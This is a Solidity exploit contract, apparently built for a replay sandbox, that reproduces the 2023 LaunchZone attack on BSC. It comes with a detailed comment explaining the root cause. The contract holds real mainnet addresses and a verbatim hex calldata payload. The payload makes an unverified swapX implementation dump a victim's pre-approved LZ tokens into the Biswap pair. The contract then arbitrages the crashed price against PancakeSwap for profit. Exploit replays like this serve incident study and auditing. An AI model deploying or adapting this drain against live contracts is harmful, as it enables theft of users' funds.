// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2023-02-LaunchZone).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`LaunchZoneExploit is Test`, `address(this)` is the attacker throughout) —
// there is no separate exploit contract to deploy. This is a faithful,
// self-contained copy of the test's inline attack (testExploit -> run()),
// compiled inside the registry forge project. Logic and constants are copied
// verbatim from test/LaunchZone_exp.sol.
//
// Root cause (cross-DEX price desync, not a bug in LaunchZone/LZ itself):
// BscexDeployer (an unrelated third party) had left LZ's Biswap-pair-adjacent
// "swapX" implementation contract (0x6D89...21a01, unverified) with an
// unlimited LZ allowance from a prior, separate compromise. Anyone can call
// that implementation with a crafted payload; the payload here makes it
// pull BscexDeployer's ENTIRE LZ balance (~9.887M LZ) via transferFrom into
// the Biswap LZ/BUSD pair, then call the pair's `swap()` directly, forcing it
// to pay out ~6.98 BUSD-equivalent-of-reserves at a price computed from
// reserves that no longer reflect a real trade — a classic "donate then
// swap()" manipulation of a Uniswap-V2-style pair. This one call craters the
// LZ price on the Biswap LZ/BUSD pool alone (its LZ reserve balloons from
// ~9.887M to ~2.15B LZ) while PancakeSwap's separate LZ/BUSD pool is
// completely unaffected and still reflects the pre-attack price. The result
// is a huge, artificial price gap for the SAME token pair across two AMMs.
// The attacker does not need to be BscexDeployer or the swapX caller at all —
// once the Biswap pool is crashed (by anyone, including the attacker itself,
// replayed here exactly as the original PoC did), LZ is dirt cheap on Biswap.
// The attacker buys ~9.887M LZ on Biswap for 50 BUSD, then immediately sells
// that same LZ on PancakeSwap (unaffected, still priced fairly) for ~88,899
// BUSD — a risk-free cross-DEX arbitrage manufactured entirely by the
// price-desync payload, not by any flaw in the attacker's own capital path.

interface UniRouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface ERC20Like {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract LaunchZoneDrain {
    ERC20Like constant LZ = ERC20Like(0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2);
    ERC20Like constant BUSD = ERC20Like(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    UniRouterLike constant BISWAPRouter = UniRouterLike(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);
    UniRouterLike constant pancackeRouter = UniRouterLike(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    address constant swapXImp = 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01; // unverified swapX implementation

    // Verbatim payload from test/LaunchZone_exp.sol — crashes the Biswap
    // LZ/BUSD pool by dumping BscexDeployer's pre-approved LZ balance into
    // the pair and forcing a manipulated swap() against it.
    bytes constant PAYLOAD =
        hex"4f1f05bc00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000082da53fc059357f82f9b400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000dad254728a37d1e80c21afae688c64d0383cc30700000000000000000000000000000000000000000000000000000000000000020000000000000000000000003b78458981eb7260d1f781cb8be2caac7027dbe2000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

    function run() external {
        // Step 1: crash the Biswap LZ/BUSD pool by replaying the price-desync
        // payload against the unverified swapX implementation. Anyone can
        // call this — it does not depend on the attacker's own capital.
        (bool success,) = swapXImp.call(PAYLOAD);
        require(success, "payload delivery failed");

        // Step 2: swap 50 BUSD for LZ on the now-crashed Biswap pool. Because
        // reserve1 (BUSD) barely moved while reserve0 (LZ) ballooned, LZ is
        // artificially cheap here.
        BUSD.approve(address(BISWAPRouter), 50 * 1e18);

        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(LZ);

        uint256[] memory amounts = BISWAPRouter.getAmountsOut(50 * 1e18, path);
        BISWAPRouter.swapExactTokensForTokens(amounts[0], amounts[1], path, address(this), block.timestamp);

        // Step 3: sell the same LZ on PancakeSwap's separate, unaffected
        // LZ/BUSD pool at the pre-crash price — the arbitrage leg that
        // realizes the profit created purely by the cross-DEX price gap.
        address[] memory path2 = new address[](2);
        path2[0] = address(LZ);
        path2[1] = address(BUSD);

        uint256[] memory amounts2 = pancackeRouter.getAmountsOut(LZ.balanceOf(address(this)), path2);

        LZ.approve(address(pancackeRouter), LZ.balanceOf(address(this)));
        pancackeRouter.swapExactTokensForTokens(amounts2[0], amounts2[1], path2, address(this), block.timestamp);
    }
}
